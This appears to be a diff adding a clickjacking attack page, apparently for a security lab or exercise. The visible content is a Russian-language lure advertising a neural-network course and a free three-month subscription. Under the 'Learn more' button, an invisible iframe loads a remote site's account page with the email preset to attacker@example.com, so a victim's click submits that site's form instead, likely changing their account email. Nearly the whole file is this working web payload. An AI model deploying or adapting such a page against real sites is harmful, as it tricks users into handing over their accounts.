@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        .banner {
+            height: 100vh;
+            position: relative;
+            background: linear-gradient(135deg, #0d0d1a, #1a1035, #0d0d1a);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .banner::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse at center, rgba(108, 99, 255, 0.25), transparent);
+
+        }
+
+        .icons-container {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+        }
+
+        .floating-icon {
+            position: absolute;
+            bottom: -60px;
+            left: var(--left);
+
+            width: 48px;
+            height: 48px;
+            opacity: 0;
+            animation: floatUp 10s ease-in-out infinite;
+            animation-delay: var(--delay);
+            filter: drop-shadow(0 0 8px rgba(167, 139, 250, 0.7));
+        }
+
+        @keyframes floatUp {
+            0% {
+                transform: translateY(0);
+                opacity: 0;
+            }
+
+            10% {
+                opacity: 1;
+            }
+
+            45% {
+                transform: translateY(-45vh) translateX(40px);
+            }
+
+            75% {
+                transform: translateY(-75vh) translateX(-50px)
+            }
+
+            100% {
+                transform: translateY(-110vh);
+                opacity: 0;
+            }
+        }
+
+        .banner-content {
+            font-family: 'Segoe UI', sans-serif;
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 640px;
+            text-align: center;
+        }
+
+        .banner-content h1 {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.15;
+            margin-bottom: 16px;
+            background: linear-gradient(135deg, #fff 0%, #a78bfa 100%);
+            background-clip: border-box;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .banner-content p {
+            font-size: 17px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.65;
+            margin-bottom: 34px;
+        }
+
+        .banner-content p strong {
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #6c63ff, #a78bfa);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 36px;
+            border-radius: 12px;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.15s;
+            box-shadow: 0 4px 20px rgba(108, 99, 255, 0.4);
+            position: relative;
+            z-index: 1;
+        }
+
+        .banner-badge {
+            display: inline-block;
+            background: rgba(108, 99, 255, 0.18);
+            border: 1px solid rgba(108, 99, 255, 0.45);
+            color: #a78bfa;
+            font-size: 13px;
+            padding: 6px 18px;
+            border-radius: 20px;
+            margin-bottom: 22px;
+            letter-spacing: 0.4px;
+        }
+
+        .target-frame {
+            position: absolute;
+            z-index: 1;
+            height: 500px;
+            width: 280px;
+            opacity: 0;
+            top: -432px;
+            left: -43px;
+        }
+
+        .iframe-wrapper {
+            position: absolute;
+            /* z-index: 0; */
+            width: 198px;
+            height: 42px;
+            overflow: hidden;
+            /* border: 3px solid #fff; */
+            bottom: 0px;
+        }
+    </style>
+    <section class="banner">
+        <div class="icons-container">
+            <div class="floating-icon" style="--left:10%; --delay: -7s"><img
+                    src="https://cdn.simpleicons.org/googlegemini/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:20%; --delay: -3s"><img
+                    src="https://cdn.simpleicons.org/googlegemini/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:35%; --delay: -7s"><img
+                    src="https://cdn.simpleicons.org/anthropic/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:41%; --delay: -9s"><img
+                    src="https://cdn.simpleicons.org/figma/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:53%; --delay: -5s"><img
+                    src="https://cdn.simpleicons.org/perplexity/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:67%; --delay: -12s"><img
+                    src="https://cdn.simpleicons.org/googlegemini/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:80%; --delay: -8s"><img
+                    src="https://cdn.simpleicons.org/anthropic/ffffff" alt=""></div>
+            <div class="floating-icon" style="--left:85%; --delay: -6s"><img
+                    src="https://cdn.simpleicons.org/figma/ffffff" alt=""></div>
+        </div>
+        <div class="banner-content">
+            <span class="banner-badge">🎁 Акция — бесплатная подписка на 3 месяца</span>
+            <h1>Учим работать <br> с нейросетями</h1>
+            <p>
+                Осваивай промпт-инжиниринг, ChatGPT, Gemini и Claude.<br>
+                Порекомендуй наш курс другу и получи <strong>бесплатную подписку</strong><br>
+                на выбранную нейросеть на 3 месяца.
+            </p>
+            <button class="btn">Узнать больше</button>
+            <div class="iframe-wrapper">
+                <iframe class="target-frame" src="http://62.173.140.174:36108/my-account?email=attacker@example.com"
+                    sandbox="allow-forms" scrolling="no"></iframe>
+            </div>
+        </div>
+    </section>
+</body>
+
+</html>
